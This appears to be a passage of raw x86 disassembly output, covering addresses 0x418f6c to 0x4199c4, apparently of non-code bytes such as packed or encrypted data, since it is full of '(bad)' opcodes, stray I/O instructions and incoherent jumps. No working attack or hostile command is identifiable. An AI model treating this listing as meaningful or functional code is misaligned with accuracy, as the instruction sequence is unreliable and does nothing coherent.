  418f6c:	in     eax,dx
  418f6d:	popf   
  418f6e:	pop    esi
  418f6f:	or     BYTE PTR [ebx+0x61],0x73
  418f73:	jecxz  0x418fa3
  418f75:	push   edi
  418f76:	add    ebx,DWORD PTR [edx-0x67]
  418f79:	add    eax,0x64167398
  418f7e:	mov    al,0x6f
  418f80:	(bad)  
  418f81:	bound  edi,QWORD PTR [esi]
  418f83:	mov    edx,0x379fad65
  418f88:	bound  eax,QWORD PTR [edx-0x73ae96fa]
  418f8e:	scas   eax,DWORD PTR es:[edi]
  418f8f:	out    0x0,ax
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x8150e59]
  419001:	je     0x419049
  419003:	xor    dl,ch
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x30000001,al
  41900d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41900e:	jl     0x418fb3
  419010:	test   DWORD PTR [eax+0x76],ecx
  419013:	fistp  WORD PTR [esi+esi*2-0x68e09f14]
  41901a:	jecxz  0x418fd0
  41901c:	adc    BYTE PTR [ecx-0x11],bh
  41901f:	push   ecx
  419020:	ss imul ch
  419023:	sub    bh,dh
  419025:	add    DWORD PTR [edx],0x6767305b
  41902b:	push   es
  41902c:	dec    edi
  41902d:	sbb    al,0xc8
  41902f:	addr16 mov ax,0x2703
  419034:	ss leave 
  419036:	lahf   
  419037:	add    eax,0x4d389412
  41903c:	pop    esi
  41903d:	pop    ds
  41903e:	pop    ds
  41903f:	push   esp
  419040:	shl    bh,cl
  419042:	xchg   ebx,eax
  419043:	into   
  419044:	cmp    DWORD PTR ds:0xc917667b,eax
  41904a:	jmp    0xea14620f
  41904f:	(bad)  
  419050:	loop   0x4190b6
  419052:	mov    al,ds:0xb1990865
  419057:	out    dx,al
  419058:	fsubrp st(5),st
  41905a:	ss pop ecx
  41905c:	js     0x419045
  41905e:	pop    ds
  41905f:	xor    DWORD PTR [ecx],0x3a
  419062:	pop    ss
  419063:	aad    0xa1
  419065:	add    DWORD PTR [edi-0x703503e9],eax
  41906b:	shl    DWORD PTR ds:0x5096cd91,0x4f
  419072:	dec    esi
  419073:	call   0x736b6d8e
  419078:	ffree  st(0)
  41907a:	xchg   ecx,eax
  41907b:	jnp    0x4190f2
  41907d:	sbb    DWORD PTR [esi-0x4bef2557],0x79564d55
  419087:	lea    ebx,[ecx+0x3b9860ca]
  41908d:	adc    BYTE PTR [ecx],ah
  41908f:	aad    0xe8
  419091:	pop    eax
  419092:	mov    esi,0x4d74f855
  419097:	(bad)  
  419098:	stos   BYTE PTR es:[edi],al
  419099:	cmp    DWORD PTR [eax+0x9],esi
  41909c:	std    
  41909d:	pop    edx
  41909e:	xchg   ebx,eax
  41909f:	in     eax,dx
  4190a0:	mov    esi,0xaad22f43
  4190a5:	aam    0x62
  4190a7:	push   ebx
  4190a8:	ds mov ebp,0xcd1a456b
  4190ae:	sbb    DWORD PTR [eax+edi*2-0x1f],eax
  4190b2:	mov    ebx,0xd8450599
  4190b7:	into   
  4190b8:	dec    esi
  4190b9:	in     al,dx
  4190ba:	and    ecx,DWORD PTR [ecx+ebp*4-0x52064c86]
  4190c1:	in     eax,dx
  4190c2:	in     eax,0xf1
  4190c4:	imul   esi,DWORD PTR [esi],0x963b6e64
  4190ca:	push   edi
  4190cb:	xchg   ebx,eax
  4190cc:	fst    QWORD PTR [ebx]
  4190ce:	sub    ebx,edi
  4190d0:	xor    esp,0xa493dedb
  4190d6:	fdiv   st,st(0)
  4190d8:	add    BYTE PTR [ebx-0x15],al
  4190db:	push   cs
  4190dc:	retf   
  4190dd:	jne    0x41912e
  4190df:	fwait
  4190e0:	adc    BYTE PTR [ebp+0x79c2a2a7],ah
  4190e6:	push   cs
  4190e7:	mov    edx,0xd805c6fc
  4190ec:	pop    esp
  4190ed:	lods   eax,DWORD PTR ds:[esi]
  4190ee:	clc    
  4190ef:	(bad)  
  4190f0:	push   eax
  4190f1:	inc    edi
  4190f2:	iret   
  4190f3:	retf   0x6899
  4190f6:	loopne 0x41914b
  4190f8:	stc    
  4190f9:	aad    0x9f
  4190fb:	xor    bh,BYTE PTR [ebx]
  4190fd:	xor    DWORD PTR [ecx+0x6c4cc6b1],ebx
  419103:	xor    dl,BYTE PTR [edi]
  419105:	or     eax,0x718329b3
  41910a:	mov    ecx,0xdeaa0cea
  41910f:	pop    esp
  419110:	add    BYTE PTR [eax],0x0
	...
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,cl
  419181:	xchg   DWORD PTR [edx+0x1b],edx
  419184:	out    dx,eax
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0xa1000001,al
  41918d:	dec    edx
  41918e:	icebp  
  41918f:	aam    0xc4
  419191:	int    0x56
  419193:	outs   dx,BYTE PTR ds:[esi]
  419194:	call   0xd5a1:0xd247a4a4
  41919b:	jne    0x4191b3
  41919d:	mov    esp,0x61e414fb
  4191a2:	and    al,0x28
  4191a4:	or     ch,ch
  4191a6:	ret    0x88dc
  4191a9:	ins    BYTE PTR es:[edi],dx
  4191aa:	mov    cl,0x14
  4191ac:	cmp    dl,bh
  4191ae:	pop    edx
  4191af:	xor    al,0xfc
  4191b1:	jbe    0x41916a
  4191b3:	bound  eax,QWORD PTR [esi]
  4191b5:	jnp    0x41918c
  4191b7:	repnz bnd ret 
  4191ba:	gs dec edx
  4191bc:	je     0x419189
  4191be:	xchg   ebx,eax
  4191bf:	fidivr DWORD PTR [ebx+0x35c5b560]
  4191c5:	adc    DWORD PTR [edi],ebx
  4191c7:	add    BYTE PTR [ecx],cl
  4191c9:	mov    ds:0x7041a5ab,eax
  4191ce:	cdq    
  4191cf:	cmp    ebx,DWORD PTR [ebp+0x2a]
  4191d2:	idiv   ebx
  4191d4:	repz mov al,0xd3
  4191d7:	gs jle 0x4191d9
  4191da:	dec    esi
  4191db:	in     al,dx
  4191dc:	adc    ebp,DWORD PTR es:[ebp+0x12a771e4]
  4191e3:	arpl   bx,cx
  4191e5:	pushf  
  4191e6:	mov    ebx,0xeae0a7d4
  4191eb:	dec    ecx
  4191ec:	out    dx,al
  4191ed:	jp     0x419262
  4191ef:	ins    BYTE PTR es:[edi],dx
  4191f0:	push   es
  4191f1:	sbb    bl,bl
  4191f3:	or     BYTE PTR [edi+0x4c],al
  4191f6:	sbb    ebp,DWORD PTR [edi+0x7]
  4191f9:	xcrypt-cbc (bad)
  4191fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191fb:	(bad)  
  4191fc:	data16 neg BYTE PTR [edi+0x67]
  419200:	je     0x4191ea
  419202:	fisub  DWORD PTR [edi-0xf]
  419205:	or     BYTE PTR ds:[eax+0x6a],cl
  419209:	sahf   
  41920a:	out    0x6e,al
  41920c:	lock push ebx
  41920e:	int    0xab
  419210:	push   0x42f6088a
  419215:	or     BYTE PTR [eax+edx*4+0x228e88f2],ah
  41921c:	or     BYTE PTR [esi-0x1a],0xdf
  419220:	retf   0x3b42
  419223:	stos   BYTE PTR es:[edi],al
  419224:	retf   
  419225:	xchg   ebp,eax
  419226:	add    DWORD PTR [edi-0x348c9bf8],esp
  41922c:	inc    ecx
  41922d:	(bad)  
  41922e:	das    
  41922f:	xchg   ebp,eax
  419230:	dec    eax
  419231:	add    edi,DWORD PTR fs:[esi]
  419234:	jbe    0x419264
  419236:	xor    BYTE PTR [esi],0xc1
  419239:	xor    eax,0x59f2f5d9
  41923e:	stos   DWORD PTR es:[edi],eax
  41923f:	sub    eax,0xafb73061
  419244:	dec    ebx
  419245:	(bad)  
  419246:	dec    ebp
  419247:	scas   eax,DWORD PTR es:[edi]
  419248:	pop    edi
  419249:	shl    BYTE PTR [edi-0x740e68e],0xc7
  419250:	mov    al,ds:0x84a8d963
  419255:	cmp    eax,0xcfe0bd8d
  41925a:	(bad)  
  41925b:	ds pop ds
  41925d:	mov    ah,BYTE PTR [edi+0x6c]
  419260:	or     dh,BYTE PTR [esi]
  419262:	loop   0x4191e5
  419264:	adc    al,0x8d
  419266:	in     al,dx
  419267:	jle    0x4192df
  419269:	(bad)  
  41926a:	fcmovbe st,st(0)
  41926c:	pop    ebx
  41926d:	sar    ebp,0xe0
  419270:	and    edi,DWORD PTR [ecx]
  419272:	mov    al,BYTE PTR [edi]
  419274:	adc    dl,BYTE PTR [eax+0x46eb940c]
  41927a:	jne    0x419207
  41927c:	dec    ebx
  41927d:	dec    ecx
  41927e:	cmp    BYTE PTR [esi],bh
  419280:	out    dx,al
  419281:	mov    eax,ds:0xee2067c8
  419286:	in     al,0xfa
  419288:	repnz (bad) 
  41928b:	cdq    
  41928c:	adc    al,0x9c
  41928e:	test   al,0xc8
  419290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	lock mov bh,0xee
  419303:	jl     0x4192f9
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x80000001,al
  41930d:	sub    al,0x76
  41930f:	push   ecx
  419310:	lock jp 0x4192a1
  419313:	pop    ebx
  419314:	scas   eax,DWORD PTR es:[edi]
  419315:	imul   esp,DWORD PTR [ebx],0x14
  419318:	xor    esp,DWORD PTR [edi]
  41931a:	sub    ebx,DWORD PTR [edi+0x1f88e8e1]
  419320:	xchg   ebx,eax
  419321:	mov    ebx,0x8c4d3c41
  419326:	add    al,BYTE PTR [edx+eax*4+0x580016b]
  41932d:	mov    cl,0x3c
  41932f:	(bad)  
  419330:	mov    ebp,0x9a92f527
  419335:	shl    BYTE PTR [edx+esi*2-0x7f],0x50
  41933a:	repz fnstcw WORD PTR [ebp+0x5f7d2a87]
  419341:	call   0x2c5a:0x5fb9b4e7
  419348:	pop    ss
  419349:	in     eax,0x7
  41934b:	sbb    eax,0x7c74d2da
  419350:	ret    0xb02b
  419353:	in     al,0xfd
  419355:	ret    0xc0bd
  419358:	sub    DWORD PTR [edi],ecx
  41935a:	xchg   BYTE PTR [ebp+0x14de37a],dl
  419360:	jnp    0x41930d
  419362:	cs dec ecx
  419364:	pop    ss
  419365:	int3   
  419366:	js     0x4193b3
  419368:	pushf  
  419369:	xchg   edx,eax
  41936a:	push   edx
  41936b:	xor    al,cl
  41936d:	aas    
  41936e:	push   ecx
  41936f:	stc    
  419370:	or     al,0xca
  419372:	fs nop
  419374:	jae    0x4193ca
  419376:	sbb    BYTE PTR fs:[ecx],bl
  419379:	fld    TBYTE PTR [eax]
  41937b:	inc    ebp
  41937c:	pop    ss
  41937d:	cs cld 
  41937f:	enter  0x9f1b,0xfd
  419383:	mov    WORD PTR [esi],gs
  419385:	fwait
  419386:	sahf   
  419387:	xchg   ecx,eax
  419388:	xchg   ecx,eax
  419389:	lahf   
  41938a:	push   cs
  41938b:	add    eax,0x67520887
  419390:	mov    dh,BYTE PTR [edi]
  419392:	adc    esp,DWORD PTR [eax-0x7c]
  419395:	test   DWORD PTR [eax+0xe],ebx
  419398:	pop    es
  419399:	mov    ebp,0x887e880f
  41939e:	mov    dl,0xb6
  4193a0:	push   edi
  4193a1:	mov    dh,0x35
  4193a3:	retf   
  4193a4:	mov    cl,0xe0
  4193a6:	mov    dh,dh
  4193a8:	(bad)  
  4193a9:	ja     0x4193c9
  4193ab:	push   edi
  4193ac:	xchg   esi,eax
  4193ad:	dec    ecx
  4193ae:	dec    ebp
  4193af:	xlat   BYTE PTR ds:[ebx]
  4193b0:	in     eax,dx
  4193b1:	shl    BYTE PTR [ebx-0x6737ce2b],0x22
  4193b8:	push   ebx
  4193b9:	int3   
  4193ba:	mov    esp,0xdd73182d
  4193bf:	add    edi,eax
  4193c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193c2:	sbb    BYTE PTR [edi-0x6],bl
  4193c5:	int    0x97
  4193c7:	xchg   edx,eax
  4193c8:	dec    ebp
  4193c9:	dec    esi
  4193ca:	jmp    0x419418
  4193cc:	mov    esp,0x23070efe
  4193d1:	iret   
  4193d2:	cmp    cl,BYTE PTR gs:[edx]
  4193d5:	add    DWORD PTR [edx-0x65db9c72],ebx
  4193db:	lods   eax,DWORD PTR ds:[esi]
  4193dc:	push   ss
  4193dd:	sbb    al,0x36
  4193df:	loope  0x4193a3
  4193e1:	add    al,0x81
  4193e3:	enter  0x2e2f,0x6a
  4193e7:	clc    
  4193e8:	imul   ebp,DWORD PTR [ebp+eiz*1-0x44],0x48
  4193ed:	ror    BYTE PTR [ebx-0x1e3cc029],0x5e
  4193f4:	sbb    eax,0xc647b38e
  4193f9:	call   0x40fcdf11
  4193fe:	mov    ?,WORD PTR [edx+0x41]
  419401:	scas   eax,DWORD PTR es:[edi]
  419402:	jecxz  0x419469
  419404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419405:	push   0xd8b81440
  41940a:	push   esp
  41940b:	and    eax,0xc299d3f9
  419410:	or     eax,0x0
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	(bad)  
  419481:	xchg   ebx,eax
  419482:	pop    ebp
  419483:	jno    0x41947e
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0x87000001,al
  41948d:	fadd   QWORD PTR [esi]
  41948f:	add    al,0x32
  419491:	shl    ah,cl
  419493:	jae    0x4194be
  419495:	mov    eax,0x1b1113e2
  41949a:	data16 lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41949d:	push   edi
  41949e:	cli    
  41949f:	pop    es
  4194a0:	js     0x419431
  4194a2:	push   ebp
  4194a3:	xchg   esi,eax
  4194a4:	adc    dl,BYTE PTR [ebp-0x4a01ce87]
  4194aa:	imul   esp,DWORD PTR [edx],0x2b
  4194ad:	push   ss
  4194ae:	les    ebx,FWORD PTR [ebp+ebx*8+0x1a]
  4194b2:	popa   
  4194b3:	iret   
  4194b4:	ret    
  4194b5:	and    eax,0xaa4f30ec
  4194ba:	xchg   edx,eax
  4194bb:	xor    al,BYTE PTR [ebx+0x44]
  4194be:	jg     0x41951b
  4194c0:	xchg   ecx,eax
  4194c1:	jo     0x41947c
  4194c3:	inc    ebp
  4194c4:	xchg   ebp,eax
  4194c5:	imul   esi,DWORD PTR [edi],0x36
  4194c8:	mov    ecx,0x6b6c3fbd
  4194cd:	jo     0x419533
  4194cf:	call   0xaeae1de0
  4194d4:	lock frstor [edx+0x18]
  4194d8:	xchg   esp,eax
  4194d9:	xchg   BYTE PTR [edx],ch
  4194db:	adc    cl,BYTE PTR [eax+0x37cf6abd]
  4194e1:	pop    eax
  4194e2:	jo     0x419529
  4194e4:	fimul  DWORD PTR [eax-0x2a0486e3]
  4194ea:	popa   
  4194eb:	clc    
  4194ec:	or     BYTE PTR [esi],ch
  4194ee:	lods   al,BYTE PTR ds:[esi]
  4194ef:	pop    ecx
  4194f0:	jmp    eax
  4194f2:	add    eax,0x6b25a8b5
  4194f7:	dec    eax
  4194f8:	jp     0x4194fb
  4194fa:	adc    DWORD PTR [bp+si-0x63aa],0x2e
  419500:	add    BYTE PTR [esi+0x7b],bl
  419503:	fdiv   QWORD PTR [esi+eiz*1+0xc]
  419507:	add    ebx,DWORD PTR [edx]
  419509:	in     eax,0xb4
  41950b:	sub    BYTE PTR [ebx-0x2e],dl
  41950e:	int    0xb8
  419510:	pop    edi
  419511:	xchg   bh,bl
  419513:	mov    edx,0xf7637cf7
  419518:	aas    
  419519:	mov    BYTE PTR [ebx+edx*2+0xb89ea59],dl
  419520:	imul   eax,ecx,0x44
  419523:	std    
  419524:	sbb    edx,DWORD PTR [esi-0x218b804d]
  41952a:	mov    ebp,0xf4407448
  41952f:	retf   0x1a1d
  419532:	mov    dh,0xaa
  419534:	xchg   edx,eax
  419535:	xchg   ecx,eax
  419536:	(bad)  
  419537:	imul   eax,DWORD PTR [edx+0x6a55f4f4],0xffffffa1
  41953e:	test   DWORD PTR [ecx+0x2b],esi
  419541:	mov    edx,0x43e6cc16
  419546:	xor    BYTE PTR [edx-0x43],ah
  419549:	mov    ebx,DWORD PTR [eax]
  41954b:	ror    BYTE PTR [edi+0x2b],cl
  41954e:	or     eax,0xca929fdd
  419553:	adc    ah,bh
  419555:	fstp   QWORD PTR [ebx+0x339535b6]
  41955b:	lea    ebp,[edx-0x5b8c4b9d]
  419561:	loopne 0x41954c
  419563:	jg     0x419510
  419565:	push   esp
  419566:	cmc    
  419567:	dec    ecx
  419568:	daa    
  419569:	jns    0x419577
  41956b:	stos   DWORD PTR es:[edi],eax
  41956c:	outs   dx,BYTE PTR ds:[esi]
  41956d:	mov    ah,0x56
  41956f:	adc    al,0xe0
  419571:	aaa    
  419572:	cmp    al,0x7e
  419574:	js     0x41954e
  419576:	mov    edi,0xd7ac2096
  41957b:	scas   eax,DWORD PTR es:[edi]
  41957c:	out    0xbc,eax
  41957e:	inc    esp
  41957f:	dec    esi
  419580:	jno    0x4195dd
  419582:	pop    esi
  419583:	hlt    
  419584:	lea    esp,[edx]
  419586:	inc    edx
  419587:	mov    ch,0x79
  419589:	sbb    DWORD PTR gs:[ebp-0x65],esi
  41958d:	call   0xe3a230
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	mov    eax,0xfea9cfb2
  419605:	or     al,0x1
  419607:	add    BYTE PTR ds:0xb5000001,al
  41960d:	clc    
  41960e:	in     al,0x6e
  419610:	sub    DWORD PTR [edi+0x2b79f7e2],edi
  419616:	add    eax,0x3483b473
  41961b:	lods   al,BYTE PTR ds:[esi]
  41961c:	addr16 mov eax,0x83b175d4
  419622:	cld    
  419623:	pop    esi
  419624:	push   ebx
  419625:	ja     0x419615
  419627:	pop    eax
  419628:	lock lea esp,[eax+0x26]
  41962c:	daa    
  41962d:	arpl   WORD PTR [eax-0x7aaa0510],bx
  419633:	fcomip st,st(0)
  419635:	cmp    BYTE PTR gs:[esi],bh
  419638:	fisubr DWORD PTR [ebx]
  41963a:	pop    ss
  41963b:	jae    0x4195ee
  41963d:	ss aaa 
  41963f:	push   0xffffff82
  419641:	fdivr  DWORD PTR [esi+esi*8]
  419644:	push   eax
  419645:	mov    WORD PTR [ebx],?
  419647:	lods   eax,DWORD PTR ds:[esi]
  419648:	int3   
  419649:	xor    al,0x7
  41964b:	stos   DWORD PTR es:[edi],eax
  41964c:	or     al,0xe5
  41964e:	jno    0x419676
  419650:	push   ds
  419651:	cwde   
  419652:	sub    DWORD PTR [edi+0x3c845231],eax
  419658:	sbb    ebx,DWORD PTR [ecx-0x5d8cb271]
  41965e:	iret   
  41965f:	sub    ch,BYTE PTR [ecx-0x7681384e]
  419665:	ss stos DWORD PTR es:[edi],eax
  419667:	inc    ebp
  419668:	mov    cs,WORD PTR [ecx+0x65]
  41966b:	mov    edx,0x43b2be1d
  419670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419671:	aad    0xf1
  419673:	mov    dl,0x12
  419675:	jge    0x41966f
  419677:	mov    esi,0x6f5e3ace
  41967c:	(bad)  
  41967d:	cli    
  41967e:	dec    ebp
  41967f:	xchg   esp,eax
  419680:	(bad)  
  419681:	js     0x41963a
  419683:	jl     0x419631
  419685:	mov    dl,0x59
  419687:	pop    ss
  419688:	aad    0xfd
  41968a:	adc    al,0x35
  41968c:	loopne 0x41968a
  41968e:	push   ebx
  41968f:	pop    eax
  419690:	add    eax,0x28bbce8b
  419695:	sub    eax,0x66c05eae
  41969a:	mov    bh,0xae
  41969c:	(bad)  
  41969d:	and    eax,0x1b66c9b4
  4196a2:	sbb    eax,0xcb836dfa
  4196a7:	ins    DWORD PTR es:[edi],dx
  4196a8:	mov    dh,0xfa
  4196aa:	inc    esp
  4196ab:	lahf   
  4196ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196ad:	in     eax,dx
  4196ae:	pop    edx
  4196af:	call   0x7fc6:0xf3453962
  4196b6:	mov    ds:0x768500d7,al
  4196bb:	jnp    0x41970a
  4196bd:	stos   BYTE PTR es:[edi],al
  4196be:	jp     0x41965d
  4196c0:	les    ebx,FWORD PTR [ebx]
  4196c2:	ret    
  4196c3:	push   esi
  4196c4:	test   eax,0xa86e3198
  4196c9:	call   0xdc9f3b6a
  4196ce:	xor    edi,DWORD PTR [edx+esi*4+0x5f]
  4196d2:	dec    ebx
  4196d3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4196d5:	(bad)  
  4196d7:	leave  
  4196d8:	int    0xd8
  4196da:	push   eax
  4196db:	jb     0x419698
  4196dd:	sub    al,0x8d
  4196df:	xor    al,0x35
  4196e1:	sub    BYTE PTR ds:0xed7dbebf,bh
  4196e7:	push   es
  4196e8:	outs   dx,BYTE PTR ds:[esi]
  4196e9:	or     BYTE PTR ds:0xeb9e43cb,al
  4196ef:	rcl    BYTE PTR [esi-0x12],cl
  4196f2:	pushf  
  4196f3:	bound  ebx,QWORD PTR [ecx+0x1f]
  4196f6:	pop    edx
  4196f7:	push   eax
  4196f8:	rcl    BYTE PTR [eax],cl
  4196fa:	fistp  QWORD PTR es:0xebde161b
  419701:	xor    cl,BYTE PTR [ecx+0x13]
  419704:	xlat   BYTE PTR ds:[ebx]
  419705:	(bad)  [edi]
  419707:	in     al,dx
  419708:	fs jle 0x4196ae
  41970b:	xor    DWORD PTR [edi+0x7b237dae],edx
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x738dd0ae
  419781:	cli    
  419782:	inc    esi
  419783:	loopne 0x419788
  419785:	push   cs
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x1
  41978d:	mov    edi,0x96d1f2f1
  419792:	out    dx,eax
  419793:	(bad)  
  419794:	push   ebp
  419795:	mov    ch,0x90
  419797:	lods   eax,DWORD PTR ds:[esi]
  419798:	test   al,0x67
  41979a:	es (bad) 
  41979c:	int    0x3c
  41979e:	jb     0x419772
  4197a0:	popf   
  4197a1:	sbb    eax,0xf47095e4
  4197a6:	add    BYTE PTR [esi],dl
  4197a8:	cmp    eax,0x1d175350
  4197ad:	fcmovb st,st(7)
  4197af:	in     al,dx
  4197b0:	xchg   DWORD PTR [edi],edi
  4197b2:	mov    ch,0xf7
  4197b4:	mov    edx,0xd4503549
  4197b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197ba:	jle    0x419752
  4197bc:	sahf   
  4197bd:	outs   dx,DWORD PTR ds:[esi]
  4197be:	mov    ch,0x34
  4197c0:	sbb    eax,DWORD PTR [edi]
  4197c2:	push   ecx
  4197c3:	dec    esi
  4197c4:	push   esi
  4197c5:	jno    0x419781
  4197c7:	adc    BYTE PTR [ebp-0x2],cl
  4197ca:	(bad)
  4197ce:	xor    BYTE PTR [ebx],ah
  4197d0:	out    0xe1,eax
  4197d2:	mov    ebx,fs
  4197d4:	fstp   TBYTE PTR [ecx+0x49]
  4197d7:	(bad)  [ecx]
  4197d9:	and    eax,0xc7afd8bd
  4197de:	sbb    al,0x6a
  4197e0:	xor    eax,0x44701717
  4197e5:	outs   dx,DWORD PTR ds:[esi]
  4197e6:	jg     0x419776
  4197e8:	xor    DWORD PTR [edi-0x22fde162],eax
  4197ee:	pop    eax
  4197ef:	sti    
  4197f0:	and    BYTE PTR [ebx+0x11c19206],al
  4197f6:	xchg   ecx,eax
  4197f7:	inc    ecx
  4197f8:	inc    edi
  4197f9:	sbb    esi,ebp
  4197fb:	pop    ecx
  4197fc:	mov    dl,0xa6
  4197fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ff:	xchg   dh,ah
  419801:	and    eax,0x5d36da11
  419806:	or     ebx,DWORD PTR [edi]
  419808:	adc    ch,ch
  41980a:	pushf  
  41980b:	xor    eax,DWORD PTR ss:[ecx]
  41980e:	cmp    DWORD PTR [edx+0x2d8600a],esp
  419814:	das    
  419815:	call   0x2561:0x870efb31
  41981c:	iret   
  41981d:	sti    
  41981e:	outs   dx,BYTE PTR ds:[esi]
  41981f:	and    BYTE PTR [esi+0x38bee7f5],dl
  419825:	ret    0xcc3b
  419828:	cmp    dh,cl
  41982a:	iret   
  41982b:	sti    
  41982c:	ins    BYTE PTR es:[edi],dx
  41982d:	or     bl,ch
  41982f:	cmp    DWORD PTR [ebx],eax
  419831:	js     0x419898
  419833:	inc    esp
  419834:	xor    al,0x25
  419836:	out    0xd5,al
  419838:	outs   dx,DWORD PTR ds:[esi]
  419839:	shr    DWORD PTR ds:0xd71de34f,0xe3
  419840:	sti    
  419841:	dec    esp
  419842:	lods   al,BYTE PTR ds:[esi]
  419843:	mov    al,ds:0xf305280a
  419848:	adc    BYTE PTR [ecx],0x9a
  41984b:	adc    eax,0x89b3c22b
  419850:	int3   
  419851:	pop    edx
  419852:	test   DWORD PTR [edi],ecx
  419854:	jns    0x4197ec
  419856:	scas   al,BYTE PTR es:[edi]
  419857:	imul   ecx,DWORD PTR [edi-0x3103f292],0x23be4958
  419861:	xchg   ebp,eax
  419862:	lods   eax,DWORD PTR ds:[esi]
  419863:	addr16 pop ebx
  419865:	or     si,WORD PTR [ebp-0x2f6f65d7]
  41986c:	pop    edx
  41986d:	pop    ebx
  41986e:	dec    BYTE PTR [esi]
  419870:	pushf  
  419871:	inc    edi
  419872:	les    eax,FWORD PTR ds:0x8d713144
  419878:	lahf   
  419879:	push   eax
  41987a:	xchg   ebx,eax
  41987b:	mov    dh,0xe5
  41987d:	push   0xffffffc9
  41987f:	leave  
  419880:	and    eax,0xc165f255
  419885:	push   ebp
  419886:	push   ecx
  419887:	pop    ebp
  419888:	rol    BYTE PTR [ebx-0x31],0x81
  41988c:	pop    edi
  41988d:	lock cli 
  41988f:	sub    al,0xd9
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  
  419901:	hlt    
  419902:	mov    eax,0x10f08a0
  419907:	add    BYTE PTR ds:0x13000001,al
  41990d:	cld    
  41990e:	pop    eax
  41990f:	scas   eax,DWORD PTR es:[edi]
  419910:	fnstsw WORD PTR [ebp-0x5c9f777f]
  419916:	aas    
  419917:	mov    bh,0x66
  419919:	clc    
  41991a:	cmp    DWORD PTR [ecx+0x1f],edx
  41991d:	jmp    0x34fc:0xf24db6e6
  419924:	mov    ebx,ebx
  419926:	push   eax
  419927:	in     al,0x6
  419929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41992a:	adc    BYTE PTR [ecx],dh
  41992c:	loopne 0x41994a
  41992e:	adc    esp,DWORD PTR [eax-0x3e5f2754]
  419934:	test   BYTE PTR [ecx-0x75],0x8
  419938:	ja     0x419965
  41993a:	dec    ebp
  41993b:	or     bh,0x62
  41993e:	nop
  41993f:	mov    cs,WORD PTR [edx]
  419941:	adc    al,0xb
  419943:	fidiv  DWORD PTR [esi+0xa14a6c8]
  419949:	call   0xc2d9a28d
  41994e:	test   DWORD PTR [ecx-0x1942a93],esp
  419954:	hlt    
  419955:	xor    al,0x76
  419957:	pop    eax
  419958:	xlat   BYTE PTR ds:[ebx]
  419959:	xchg   edi,eax
  41995a:	xchg   esp,eax
  41995b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41995c:	sub    DWORD PTR [esi+0x1e25d7f3],esi
  419962:	dec    edx
  419963:	or     eax,0xf52f2916
  419968:	adc    DWORD PTR [eax],ebp
  41996a:	add    eax,ecx
  41996c:	xchg   ecx,eax
  41996d:	or     al,0x5d
  41996f:	xchg   ebx,eax
  419970:	add    ebx,eax
  419972:	cmp    BYTE PTR ds:0x554439b8,0x97
  419979:	or     eax,0x44ce0c43
  41997e:	int3   
  41997f:	loopne 0x41996a
  419981:	jne    0x419962
  419983:	cmp    dl,ch
  419985:	mov    bl,0xa5
  419987:	or     BYTE PTR [esp+ebx*8],al
  41998a:	nop
  41998b:	gs popf 
  41998d:	jmp    0x300c4445
  419992:	int3   
  419993:	sahf   
  419994:	gs pop edx
  419996:	jae    0x4199ac
  419998:	push   ds
  419999:	(bad)  
  41999a:	das    
  41999b:	lods   eax,DWORD PTR ds:[esi]
  41999c:	jl     0x4199a3
  41999e:	mov    cl,0xa6
  4199a0:	push   ebx
  4199a1:	(bad)  
  4199a2:	cs dec eax
  4199a4:	sub    ah,BYTE PTR [ecx+ebp*2-0x2f262cff]
  4199ab:	ds xchg ebx,eax
  4199ad:	pop    ds
  4199ae:	mov    esp,0x6e73663d
  4199b3:	xchg   ecx,eax
  4199b4:	mov    ds:0xcfa91818,eax
  4199b9:	jb     0x419954
  4199bb:	not    BYTE PTR [esi+eiz*2-0x51]
  4199bf:	xchg   esp,eax
  4199c0:	xchg   esp,eax
  4199c1:	cmp    al,BYTE PTR [ebp-0x3d]
  4199c4:	or     dh,BYTE PTR ds:0xef570a63
